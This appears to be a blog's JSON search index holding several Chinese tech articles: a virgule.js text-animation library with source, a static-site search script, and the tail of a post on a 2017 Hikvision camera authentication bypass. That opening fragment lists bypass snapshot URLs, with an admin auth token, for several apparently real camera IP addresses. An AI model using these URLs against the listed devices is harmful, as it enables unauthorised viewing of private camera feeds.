auth=YWRtaW46MTEK&amp;nbsp;http://183.238.201.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://111.194.239.146:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://61.131.71.114:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://218.94.67.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://218.88.5.67:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://183.63.221.22:88/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK&amp;nbsp;......&amp;nbsp;也可以选择在show.html查看可用度。&amp;nbsp;其余如何利用漏洞的环节不再赘述，不要用于非法用途。&amp;nbsp;后言&amp;nbsp;上述就是对2017年&amp;nbsp;HikvisionIP摄像头后台绕过漏洞的应用，&amp;nbsp;终。&amp;nbsp;","img":["/articles/20221224/img1.png","/articles/20221224/img2.png"],"links":["https://github.com/WormChickenWizard/hikvision-decrypter","https://github.com/knownsec/ZoomEye-python","show.htm"]},{"name":"Virgule.js现已发布","url":"/articles/20221126/","time":"2022-11-26","class":["技术","设计"],"tag":["javascript"],"title":["前言","效果","升级前后对比","即时体验","使用","直接引入javascript脚本","手动复制源代码","实现方法","关键分析","后言"],"context":"&amp;nbsp;前言&amp;nbsp;22年暑假时，我把博客首页的打字机特效换成了类似于现在这种，但是当时也是随便做出来玩玩的，不仅功能单一，结构臃肿，用了530行js也只能达到让主页有两句循环的轮播，实在太不优雅。&amp;nbsp;今年十月初我决定重制这个功能将其从530行压缩到370行，并在原有的基础上加入了跳过空格、自定义速度、快捷引用目标等功能，并将其封装为函数，现在想要使用只需一句：&amp;nbsp;virgule(target,context,speed)&amp;nbsp;太优雅了。&amp;nbsp;项目现已开源。@Github:RavelloH/virgule.js&amp;nbsp;效果&amp;nbsp;升级前后对比&amp;nbsp;升级前&amp;nbsp;升级后&amp;nbsp;即时体验&amp;nbsp;运行&amp;nbsp;上方左侧填入替换内容，右侧设置速度...&amp;nbsp;使用&amp;nbsp;直接引入JavaScript脚本&amp;nbsp;&lt;script&amp;nbsp;src=&quot;https://ravelloh.github.io/virgule.js/virgule.js&quot;&gt;&lt;/script&gt;&amp;nbsp;手动复制源代码&amp;nbsp;//&amp;nbsp;Author:RavelloH&amp;nbsp;//&amp;nbsp;LICENCE:&amp;nbsp;MIT&amp;nbsp;//&amp;nbsp;Repo&amp;nbsp;src:&amp;nbsp;github.com/RavelloH/virgule.js&amp;nbsp;randArrMin&amp;nbsp;=&amp;nbsp;[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;,&quot;H&quot;,&quot;I&quot;,&quot;J&quot;,&quot;K&quot;,&quot;L&quot;,&quot;M&quot;,&quot;N&quot;,&quot;O&quot;,&quot;P&quot;,&quot;Q&quot;,&quot;R&quot;,&quot;S&quot;,&quot;T&quot;,&quot;U&quot;,&quot;V&quot;,&quot;W&quot;,&quot;X&quot;,&quot;Y&quot;,&quot;Z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;];&amp;nbsp;randArr&amp;nbsp;=&amp;nbsp;[&quot;あ&quot;,&quot;ぃ&quot;,&quot;い&quot;,&quot;ぅ&quot;,&quot;う&quot;,&quot;ぇ&quot;,&quot;え&quot;,&quot;ぉ&quot;,&quot;お&quot;,&quot;か&quot;,&quot;が&quot;,&quot;き&quot;,&quot;ぎ&quot;,&quot;く&quot;,&quot;ぐ&quot;,&quot;け&quot;,&quot;げ&quot;,&quot;こ&quot;,&quot;ご&quot;,&quot;さ&quot;,&quot;ざ&quot;,&quot;し&quot;,&quot;じ&quot;,&quot;す&quot;,&quot;ず&quot;,&quot;せ&quot;,&quot;ぜ&quot;,&quot;そ&quot;,&quot;ぞ&quot;,&quot;た&quot;,&quot;だ&quot;,&quot;ち&quot;,&quot;ぢ&quot;,&quot;っ&quot;,&quot;つ&quot;,&quot;づ&quot;,&quot;て&quot;,&quot;で&quot;,&quot;と&quot;,&quot;ど&quot;,&quot;な&quot;,&quot;に&quot;,&quot;ぬ&quot;,&quot;ね&quot;,&quot;の&quot;,&quot;は&quot;,&quot;ば&quot;,&quot;ぱ&quot;,&quot;ひ&quot;,&quot;び&quot;,&quot;ぴ&quot;,&quot;ふ&quot;,&quot;ぶ&quot;,&quot;ぷ&quot;,&quot;へ&quot;,&quot;べ&quot;,&quot;ぺ&quot;,&quot;ほ&quot;,&quot;ぼ&quot;,&quot;ぽ&quot;,&quot;ま&quot;,&quot;み&quot;,&quot;む&quot;,&quot;め&quot;,&quot;も&quot;,&quot;ゃ&quot;,&quot;や&quot;,&quot;ゅ&quot;,&quot;ゆ&quot;,&quot;ょ&quot;,&quot;よ&quot;,&quot;ら&quot;,&quot;り&quot;,&quot;る&quot;,&quot;れ&quot;,&quot;ろ&quot;,&quot;ゎ&quot;,&quot;わ&quot;,&quot;ゐ&quot;,&quot;ゑ&quot;,&quot;を&quot;,&quot;ん&quot;,&quot;ゔ&quot;,&quot;ゕ&quot;,&quot;ゖ&quot;,&quot;ァ&quot;,&quot;ア&quot;,&quot;ィ&quot;,&quot;イ&quot;,&quot;ゥ&quot;,&quot;ウ&quot;,&quot;ェ&quot;,&quot;エ&quot;,&quot;ォ&quot;,&quot;オ&quot;,&quot;カ&quot;,&quot;ガ&quot;,&quot;キ&quot;,&quot;ギ&quot;,&quot;ク&quot;,&quot;グ&quot;,&quot;ケ&quot;,&quot;ゲ&quot;,&quot;コ&quot;,&quot;ゴ&quot;,&quot;サ&quot;,&quot;ザ&quot;,&quot;シ&quot;,&quot;ジ&quot;,&quot;ス&quot;,&quot;ズ&quot;,&quot;セ&quot;,&quot;ゼ&quot;,&quot;ソ&quot;,&quot;ゾ&quot;,&quot;タ&quot;,&quot;ダ&quot;,&quot;チ&quot;,&quot;ヂ&quot;,&quot;ッ&quot;,&quot;ツ&quot;,&quot;ヅ&quot;,&quot;テ&quot;,&quot;デ&quot;,&quot;ト&quot;,&quot;ド&quot;,&quot;ナ&quot;,&quot;ニ&quot;,&quot;ヌ&quot;,&quot;ネ&quot;,&quot;ノ&quot;,&quot;ハ&quot;,&quot;バ&quot;,&quot;パ&quot;,&quot;ヒ&quot;,&quot;ビ&quot;,&quot;ピ&quot;,&quot;フ&quot;,&quot;ブ&quot;,&quot;プ&quot;,&quot;ヘ&quot;,&quot;ベ&quot;,&quot;ペ&quot;,&quot;ホ&quot;,&quot;ボ&quot;,&quot;ポ&quot;,&quot;マ&quot;,&quot;ミ&quot;,&quot;ム&quot;,&quot;メ&quot;,&quot;モ&quot;,&quot;ャ&quot;,&quot;ヤ&quot;,&quot;ュ&quot;,&quot;ユ&quot;,&quot;ョ&quot;,&quot;ヨ&quot;,&quot;ラ&quot;,&quot;リ&quot;,&quot;ル&quot;,&quot;レ&quot;,&quot;ロ&quot;,&quot;ヮ&quot;,&quot;ワ&quot;,&quot;ヰ&quot;,&quot;ヱ&quot;,&quot;ヲ&quot;,&quot;ン&quot;,&quot;ヴ&quot;,&quot;ヵ&quot;,&quot;ヶ&quot;,&quot;ヷ&quot;,&quot;ヸ&quot;,&quot;ヹ&quot;,&quot;ヺ&quot;,&quot;ー&quot;,&quot;ヾ&quot;,&quot;ㄅ&quot;,&quot;ㄆ&quot;,&quot;ㄇ&quot;,&quot;ㄈ&quot;,&quot;ㄉ&quot;,&quot;ㄊ&quot;,&quot;ㄋ&quot;,&quot;ㄌ&quot;,&quot;ㄍ&quot;,&quot;ㄎ&quot;,&quot;ㄏ&quot;,&quot;ㄐ&quot;,&quot;ㄑ&quot;,&quot;ㄒ&quot;,&quot;ㄓ&quot;,&quot;ㄔ&quot;,&quot;ㄕ&quot;,&quot;ㄖ&quot;,&quot;ㄗ&quot;,&quot;ㄘ&quot;,&quot;ㄙ&quot;,&quot;ㄝ&quot;,&quot;ㄞ&quot;,&quot;ㄟ&quot;,&quot;ㄠ&quot;,&quot;ㄡ&quot;,&quot;ㄢ&quot;,&quot;ㄣ&quot;,&quot;ㄤ&quot;,&quot;ㄥ&quot;,&quot;ㄦ&quot;,&quot;ㄧ&quot;,&quot;ㄨ&quot;,&quot;ㄩ&quot;,&quot;〇&quot;,&quot;口&quot;,&quot;甲&quot;,&quot;乙&quot;,&quot;丙&quot;,&quot;丁&quot;,&quot;戊&quot;,&quot;己&quot;,&quot;庚&quot;,&quot;辛&quot;,&quot;壬&quot;,&quot;癸&quot;,];&amp;nbsp;function&amp;nbsp;virgule(target,&amp;nbsp;context,&amp;nbsp;speed&amp;nbsp;=&amp;nbsp;100)&amp;nbsp;{&amp;nbsp;//context重组&amp;nbsp;contextArr&amp;nbsp;=&amp;nbsp;[];&amp;nbsp;for&amp;nbsp;(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;context.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;contextArr.push(context[i])&amp;nbsp;}&amp;nbsp;//&amp;nbsp;添加/&amp;nbsp;target.innerHTML&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;numVirgule&amp;nbsp;=&amp;nbsp;0&amp;nbsp;var&amp;nbsp;virgulegenerate&amp;nbsp;=&amp;nbsp;setInterval(&amp;nbsp;function()&amp;nbsp;{&amp;nbsp;//&amp;nbsp;字符划分&amp;nbsp;if&amp;nbsp;(escape(contextArr[numVirgule]).indexOf(&quot;%u&quot;)&amp;nbsp;&lt;&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(contextArr[numVirgule]&amp;nbsp;==&amp;nbsp;&#39;&amp;nbsp;&#39;)&amp;nbsp;{&amp;nbsp;target.innerHTML&amp;nbsp;+=&amp;nbsp;&#39;&amp;nbsp;&#39;&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;target.innerHTML&amp;nbsp;+=&amp;nbsp;&#39;/&#39;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;target.innerHTML&amp;nbsp;+=&amp;nbsp;&#39;//&#39;&amp;nbsp;}&amp;nbsp;numVirgule&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;if&amp;nbsp;(numVirgule&amp;nbsp;&gt;&amp;nbsp;context.length)&amp;nbsp;{&amp;nbsp;clearInterval(virgulegenerate);&amp;nbsp;target.innerHTML&amp;nbsp;=&amp;nbsp;target.innerHTML.slice(0,&amp;nbsp;target.innerHTML.length-1)&amp;nbsp;setTimeout(function()&amp;nbsp;{&amp;nbsp;textIn()},&amp;nbsp;100)&amp;nbsp;}&amp;nbsp;},&amp;nbsp;1000/speed)&amp;nbsp;//&amp;nbsp;文字进入&amp;nbsp;numIn&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;numCharacter&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;function&amp;nbsp;textIn()&amp;nbsp;{&amp;nbsp;originText&amp;nbsp;=&amp;nbsp;target.innerHTML;&amp;nbsp;var&amp;nbsp;virgulereplace&amp;nbsp;=&amp;nbsp;setInterval(&amp;nbsp;function()&amp;nbsp;{&amp;nbsp;numIn&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;if&amp;nbsp;(numIn&amp;nbsp;&gt;=&amp;nbsp;contextArr.length)&amp;nbsp;{&amp;nbsp;clearInterval(virgulereplace)&amp;nbsp;textwrite()&amp;nbsp;}&amp;nbsp;cacheText&amp;nbsp;=&amp;nbsp;&#39;&#39;&amp;nbsp;numCharacter&amp;nbsp;=&amp;nbsp;0&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;numIn;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(escape(contextArr[i]).indexOf(&quot;%u&quot;)&amp;nbsp;&lt;&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(contextArr[i]&amp;nbsp;==&amp;nbsp;&#39;&amp;nbsp;&#39;)&amp;nbsp;{&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;&#39;&amp;nbsp;&#39;&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//单字符&amp;nbsp;var&amp;nbsp;rand&amp;nbsp;=&amp;nbsp;Math.floor(Math.random()&amp;nbsp;*&amp;nbsp;randArrMin.length);&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;randArrMin[rand]&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;}&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//&amp;nbsp;双字符&amp;nbsp;var&amp;nbsp;rand&amp;nbsp;=&amp;nbsp;Math.floor(Math.random()&amp;nbsp;*&amp;nbsp;randArr.length);&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;randArr[rand]&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;2&amp;nbsp;}&amp;nbsp;}&amp;nbsp;target.innerHTML&amp;nbsp;=&amp;nbsp;cacheText&amp;nbsp;+&amp;nbsp;originText.slice(numCharacter,&amp;nbsp;originText.length)&amp;nbsp;},&amp;nbsp;2000/speed)&amp;nbsp;//&amp;nbsp;原始文字写入&amp;nbsp;numWrite&amp;nbsp;=&amp;nbsp;0&amp;nbsp;function&amp;nbsp;textwrite()&amp;nbsp;{&amp;nbsp;originText&amp;nbsp;=&amp;nbsp;target.innerHTML;&amp;nbsp;var&amp;nbsp;virgulewrite&amp;nbsp;=&amp;nbsp;setInterval(&amp;nbsp;function()&amp;nbsp;{&amp;nbsp;numWrite&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;if&amp;nbsp;(numWrite&amp;nbsp;&gt;=&amp;nbsp;contextArr.length)&amp;nbsp;{&amp;nbsp;clearInterval(virgulewrite)&amp;nbsp;}&amp;nbsp;cacheText&amp;nbsp;=&amp;nbsp;&#39;&#39;&amp;nbsp;numCharacter&amp;nbsp;=&amp;nbsp;0&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;numIn;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(escape(contextArr[i]).indexOf(&quot;%u&quot;)&amp;nbsp;&lt;&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(contextArr[i]&amp;nbsp;==&amp;nbsp;&#39;&amp;nbsp;&#39;)&amp;nbsp;{&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;&#39;&amp;nbsp;&#39;&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//单字符&amp;nbsp;var&amp;nbsp;rand&amp;nbsp;=&amp;nbsp;Math.floor(Math.random()&amp;nbsp;*&amp;nbsp;randArrMin.length);&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;randArrMin[rand]&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;}&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//&amp;nbsp;双字符&amp;nbsp;var&amp;nbsp;rand&amp;nbsp;=&amp;nbsp;Math.floor(Math.random()&amp;nbsp;*&amp;nbsp;randArr.length);&amp;nbsp;cacheText&amp;nbsp;+=&amp;nbsp;randArr[rand]&amp;nbsp;numCharacter&amp;nbsp;+=&amp;nbsp;2&amp;nbsp;}&amp;nbsp;}&amp;nbsp;target.innerHTML&amp;nbsp;=&amp;nbsp;context.slice(0,&amp;nbsp;numWrite)&amp;nbsp;+&amp;nbsp;cacheText.slice(numWrite,&amp;nbsp;cacheText.length)&amp;nbsp;+&amp;nbsp;originText.slice(numCharacter,&amp;nbsp;originText.length)&amp;nbsp;},&amp;nbsp;2000/speed)&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;用以上任意一种方法，获取到JS即可。接下来就是如何使用，也十分方便：&amp;nbsp;virgule(target,context,speed)&amp;nbsp;//target&amp;nbsp;context必填，speed可选填，默认100&amp;nbsp;//example:&amp;nbsp;virgule(document.getElementById(&#39;jumping&#39;),&amp;nbsp;&#39;Place&amp;nbsp;the&amp;nbsp;text&amp;nbsp;you&amp;nbsp;want&amp;nbsp;as&amp;nbsp;the&amp;nbsp;result&amp;nbsp;here&#39;,100)&amp;nbsp;//对文档中一个id为jumping的元素使用virgule效果，目标文字是&quot;Place&amp;nbsp;the&amp;nbsp;text&amp;nbsp;you&amp;nbsp;want&amp;nbsp;as&amp;nbsp;the&amp;nbsp;result&amp;nbsp;here&quot;，速度为100&amp;nbsp;需要注意的是，此项目需搭配等宽字体使用，如自带的Courier&amp;nbsp;New、Terminal等，或者自己引入其他等宽字体。&amp;nbsp;这里推荐Microsoft&amp;nbsp;Yahei&amp;nbsp;Mono和SF&amp;nbsp;Mono&amp;nbsp;SC。&amp;nbsp;实现方法&amp;nbsp;注:下方行数表示以上Js代码所处行数。&amp;nbsp;4-5：定义了两个列表randArrMin以及randArr，前者用于一个英文字符宽的字符的替换，后者用于一个中文字符宽的替换。&amp;nbsp;7：定义了virgule的主函数，默认参数中targetcontext必填，speed选填，默认100。&amp;nbsp;8-12：将context中的内容转换到contextArr中储存。&amp;nbsp;14-15：重置目标&amp;nbsp;16-36：创建延迟循环virgulegenerate，间隔1000/speed毫秒。&amp;nbsp;18-28：判断中英文，中文插入两个/，英文插入一个/，空格插入空格。&amp;nbsp;29-34：判断何时结束斜杠的插入动作，延迟100ms唤起textIn()&amp;nbsp;39-40：重置变量&amp;nbsp;41-109：textIn()主函数，用于将生成的斜杠替换为context文字。&amp;nbsp;43：创建定时器virgulereplace，间隔2000/speed毫秒&amp;nbsp;46-49：终止器，用于在此环节结束后呼出下一个操作函数textWrite()&amp;nbsp;52-69：二次递归循环，用于按上一级循环进行量将对应数量斜杠替换为随机文字，同样分双字符、单字符、空格三种情况。&amp;nbsp;70：对应写入，切分随机字符组与斜杠字符组，保证总长度不变。&amp;nbsp;16-108：textIn()函数下的二级函数textWrite()，用于在将target中所有字符替换为随机字符后，继续将随机字符替换为context()&amp;nbsp;79-83：在所有过程结束后终止定时器&amp;nbsp;86-103：同52-69，将contextArr中内容逐个添加进去。&amp;nbsp;104：重组字符串，酱三个列表中的内容整合写入target中。&amp;nbsp;关键分析&amp;nbsp;其实整个过程中最复杂的是三个插入过程的顺序。这简单来说，分为以下三个阶段：&amp;nbsp;1.用斜杠覆盖文本。&amp;nbsp;2.逐渐将斜杠替换为随机文字。这一过程中，每将一个斜杠组替换一个新字符，就会重新将它前面的随机字符再随机化。&amp;nbsp;3.用target中的文字替换随机文字。这一过程大体与2相反，没将一个随机字符替换为目标字符，就会刷新其后的随机字符。&amp;nbsp;以上三个过程顺次进行，每个过程完成后唤起下一个过程。如果还不理解，可以在#效果章节的在线体验中，选择较低的速度运行，以理解这三个过程。&amp;nbsp;后言&amp;nbsp;上述就是virgule.js现有的功能介绍和使用方法，顺带着也写了大体的实现方法。&amp;nbsp;本来打算把virgule效果应用给整个博客的，但碍于实在找不到什么地方再去添加，先鸽了。&amp;nbsp;","img":["/articles/20221126/old.gif","/articles/20221126/new.gif"],"links":["https://github.com/RavelloH/virgule.js"]},{"name":"静态站实现全站搜索","url":"/articles/20220825/","time":"2022-08-25","class":["技术","设计"],"tag":["javascript","json","python"],"title":["前言","效果","搜索示例","实现方式","数据生成","搜索处理","后言"],"context":"&amp;nbsp;注：本文中的项目已更新重构，前往新的文章以查看更快速高效的v2.0版本&amp;nbsp;前言&amp;nbsp;全站搜索这一功能我想加入到我的博客中不是一年两年的事了。但因自己现在弃用Hexo转而自己做博客，这两年搜索这个功能就一直未能实现。&amp;nbsp;最近自己偶然有新想法，就给实现了。效果还不错，现在搭配Github&amp;nbsp;Actions使用，可以实现新文章自动索引，实现了自动化。&amp;nbsp;效果&amp;nbsp;搜索示例&amp;nbsp;要想充分体验，还是自己去试试的好。转到Articles索引页&amp;nbsp;实现方式&amp;nbsp;数据生成&amp;nbsp;要想在静态页搜索，就要自己创建索引。这里使用python来创建一个JSON，存储全站文章信息：&amp;nbsp;#&amp;nbsp;-*-&amp;nbsp;coding:&amp;nbsp;utf-8&amp;nbsp;-*-&amp;nbsp;##&amp;nbsp;使用有问题请到github.com/ravelloh/RPageSearch提ISSUE&amp;nbsp;###&amp;nbsp;Author:&amp;nbsp;RavelloH&amp;nbsp;####&amp;nbsp;LICENCE:&amp;nbsp;MIT&amp;nbsp;#####&amp;nbsp;RPageSearch&amp;nbsp;import&amp;nbsp;os&amp;nbsp;from&amp;nbsp;bs4&amp;nbsp;import&amp;nbsp;BeautifulSoup&amp;nbsp;##&amp;nbsp;设置目标&amp;nbsp;target&amp;nbsp;=&amp;nbsp;&#39;./articles/&#39;&amp;nbsp;#&amp;nbsp;目录位置&amp;nbsp;layers&amp;nbsp;=&amp;nbsp;1&amp;nbsp;#&amp;nbsp;遍历层数&amp;nbsp;targettype&amp;nbsp;=&amp;nbsp;&#39;html&#39;&amp;nbsp;#&amp;nbsp;文件后缀名(只支持html)&amp;nbsp;main_structure_head=&#39;{&quot;articles&quot;:[&#39;&amp;nbsp;main_structure_end=&#39;]}&#39;&amp;nbsp;inner_structure_1=&#39;{&quot;title&quot;:&quot;&#39;&amp;nbsp;inner_structure_2=&#39;&quot;,&quot;path&quot;:&quot;&#39;&amp;nbsp;inner_structure_3=&#39;&quot;,&quot;time&quot;:&quot;&#39;&amp;nbsp;inner_structure_4=&#39;&quot;,&quot;text&quot;:&quot;&#39;&amp;nbsp;inner_structure_5=&#39;&quot;}&#39;&amp;nbsp;##&amp;nbsp;打开目标目录&amp;nbsp;targetfile&amp;nbsp;=&amp;nbsp;[]&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;os.listdir(target):&amp;nbsp;if&amp;nbsp;&#39;.&#39;&amp;nbsp;not&amp;nbsp;in&amp;nbsp;i:&amp;nbsp;for&amp;nbsp;k&amp;nbsp;in&amp;nbsp;os.listdir(target&amp;nbsp;+i):&amp;nbsp;if&amp;nbsp;targettype&amp;nbsp;in&amp;nbsp;k:&amp;nbsp;targetfile.append(target&amp;nbsp;+&amp;nbsp;i&amp;nbsp;+&amp;nbsp;&#39;/&#39;&amp;nbsp;+&amp;nbsp;k)&amp;nbsp;##&amp;nbsp;按时间顺序排序&amp;nbsp;targetfilenum&amp;nbsp;=&amp;nbsp;[]&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;targetfile:&amp;nbsp;targetfilenum.append(i[11:19])&amp;nbsp;targetfilenum.sort(reverse=True)&amp;nbsp;targetfile=[]&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;targetfilenum:&amp;nbsp;targetfile.append(&#39;./articles/&#39;+str(i)+&#39;/index.html&#39;)&amp;nbsp;##&amp;nbsp;解析重构目标文件&amp;nbsp;inner_structure_cache=[]&amp;nbsp;inner_structure_text=&#39;&#39;&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;targetfile:&amp;nbsp;inner_structure_text&amp;nbsp;=&amp;nbsp;&#39;&#39;&amp;nbsp;with&amp;nbsp;open(i,&#39;r&#39;)&amp;nbsp;as&amp;nbsp;f:&amp;nbsp;filecontent&amp;nbsp;=&amp;nbsp;BeautifulSoup(f.read(),&#39;html.parser&#39;)&amp;nbsp;textlist&amp;nbsp;=&amp;nbsp;filecontent.find_all(name=&#39;p&#39;)&amp;nbsp;title&amp;nbsp;=&amp;nbsp;filecontent.find_all(name=&#39;h2&#39;)&amp;nbsp;titlelen=len(title)&amp;nbsp;length&amp;nbsp;=&amp;nbsp;len(textlist)&amp;nbsp;for&amp;nbsp;j&amp;nbsp;in&amp;nbsp;range(length):&amp;nbsp;inner_structure_text=inner_structure_text+textlist[j].get_text()&amp;nbsp;time&amp;nbsp;=&amp;nbsp;i[-19:-11]&amp;nbsp;time&amp;nbsp;=&amp;nbsp;time[0:4]+&#39;-&#39;+time[4:6]+&#39;-&#39;+time[6:8]&amp;nbsp;title&amp;nbsp;=&amp;nbsp;title[titlelen-1]&amp;nbsp;path&amp;nbsp;=&amp;nbsp;i[1:][:-10]&amp;nbsp;inner_structure_text=inner_structure_text.replace(&#39;&amp;nbsp;&#39;,&#39;&#39;).replace(&#39;\\n&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;).replace(&#39;\\\\&#39;,&#39;&#39;)&amp;nbsp;inner_structure_all&amp;nbsp;=&amp;nbsp;inner_structure_1&amp;nbsp;+&amp;nbsp;str(title.get_text())&amp;nbsp;+&amp;nbsp;inner_structure_2&amp;nbsp;+&amp;nbsp;str(path)&amp;nbsp;+&amp;nbsp;inner_structure_3&amp;nbsp;+&amp;nbsp;str(time)&amp;nbsp;+&amp;nbsp;inner_structure_4&amp;nbsp;+&amp;nbsp;inner_structure_text&amp;nbsp;+&amp;nbsp;inner_structure_5&amp;nbsp;inner_structure_cache.append(inner_structure_all)&amp;nbsp;##&amp;nbsp;重构完整JSON&amp;nbsp;main_structure&amp;nbsp;=&amp;nbsp;main_structure_head&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;inner_structure_cache:&amp;nbsp;main_structure&amp;nbsp;=&amp;nbsp;main_structure&amp;nbsp;+&amp;nbsp;i&amp;nbsp;+&amp;nbsp;&#39;,&#39;&amp;nbsp;main_structure&amp;nbsp;=&amp;nbsp;main_structure[:-1]&amp;nbsp;+&amp;nbsp;main_structure_end&amp;nbsp;total_str&amp;nbsp;=&amp;nbsp;&#39;var&amp;nbsp;SearchResult&amp;nbsp;=&amp;nbsp;&quot;&#39;&amp;nbsp;+&amp;nbsp;main_structure.replace(&#39;&quot;&#39;,&#39;\\\\&quot;&#39;)&amp;nbsp;+&amp;nbsp;&#39;&quot;&#39;&amp;nbsp;print(total_str)&amp;nbsp;#&amp;nbsp;写入JSON#文件&amp;nbsp;with&amp;nbsp;open(&#39;./js/searchdata.js&#39;,&#39;w+&#39;)&amp;nbsp;as&amp;nbsp;#1:&amp;nbsp;f1.write(total_str)&amp;nbsp;上述代码实现了将articles目录下所有文件夹中以.html后缀结尾的文件中的p标签中文字提取出来，并顺便提取h2的文章标题。不过因为python中直接使用os.dirlist扫出的文件名是乱序，为方便后续排序还需要按照时间顺序排序，其中因为我的文章存储方式是以时间排序的，如这篇文章的存储结构就是/articles/20220825/inxex.html，因为时间可以直接从文件夹中读出，时间排序比较方便，7行就搞定了，如果是其余方式也同理。上述代码运行后，得出的应该是类似于如下结构的json:&amp;nbsp;{&amp;nbsp;&quot;articles&quot;:[{&amp;nbsp;&quot;title&quot;:&quot;文章标题&quot;,&quot;path&quot;:&quot;相对路径&quot;,&quot;time&quot;:&quot;更新时间&quot;,&quot;text&quot;:&quot;所有正文&quot;&amp;nbsp;},&amp;nbsp;{&amp;nbsp;&quot;title&quot;:&quot;文章标题&quot;,&quot;path&quot;:&quot;相对路径&quot;,&quot;time&quot;:&quot;更新时间&quot;,&quot;text&quot;:&quot;所有正文&quot;&amp;nbsp;},&amp;nbsp;{&amp;nbsp;&quot;title&quot;:&quot;文章标题&quot;,&quot;path&quot;:&quot;相对路径&quot;,&quot;time&quot;:&quot;更新时间&quot;,&quot;text&quot;:&quot;所有正文&quot;&amp;nbsp;}]&amp;nbsp;}&amp;nbsp;这样全站搜索的json就生成完成了，为了方便引用，上述代码最后会将这个json改为js格式，并转义&quot;字符。&amp;nbsp;这样，就可以在后续处理搜索时直接引用js，其中json存储在变量SearchResult中。&amp;nbsp;搜索处理&amp;nbsp;有了json，搜索就只需在前端实现了。这样可以脱离服务器的限制，唯一限制速度的是访客的设备性能。&amp;nbsp;但因为这里只是简单的字符串搜索，性能需求并不大，下面我写的代码虽说并没有做到极限优化，但也通过多层次搜索降低了一部分运算量，可以做到实时搜索输入数据。&amp;nbsp;以下是HTML与JavaScript代码。当然，这跟我博客上的不一样，博客上还加入了一些css过渡之类的，不过本篇重点也不是css，如果有需求可自行到博客articles页F12看看。博客源代码在github，见此。&amp;nbsp;&lt;div&amp;nbsp;class=&#39;searchbox&#39;&gt;&lt;/span&gt;&amp;nbsp;&lt;form&amp;nbsp;class=&quot;searchbox&quot;&amp;nbsp;onSubmit=&quot;return&amp;nbsp;check();&quot;&amp;nbsp;autocomplete=&quot;off&quot;&gt;&amp;nbsp;&lt;input&amp;nbsp;type=&quot;text&quot;&amp;nbsp;placeholder=&quot;从所有文章内检索...&quot;&amp;nbsp;name=&quot;search&quot;&amp;nbsp;oninput=&quot;searchtext()&quot;&amp;nbsp;onpropertychange=&quot;searchtext()&quot;&gt;&amp;nbsp;&lt;button&amp;nbsp;type=&quot;button&quot;&amp;nbsp;id=&#39;searchbutton&#39;&gt;&lt;span&amp;nbsp;class=&quot;i_mini&amp;nbsp;ri:search-line&quot;&gt;&lt;/span&gt;&lt;/button&gt;&amp;nbsp;&lt;div&amp;nbsp;class=&quot;resultlist&quot;&amp;nbsp;id=&quot;resultlist&quot;&gt;&amp;nbsp;&lt;i&gt;-&amp;nbsp;搜索&amp;nbsp;-&lt;/i&gt;&lt;hr&gt;&lt;p&amp;nbsp;align=&quot;center&quot;&gt;&amp;nbsp;输入关键词以在文章标题及正文中查询&amp;nbsp;&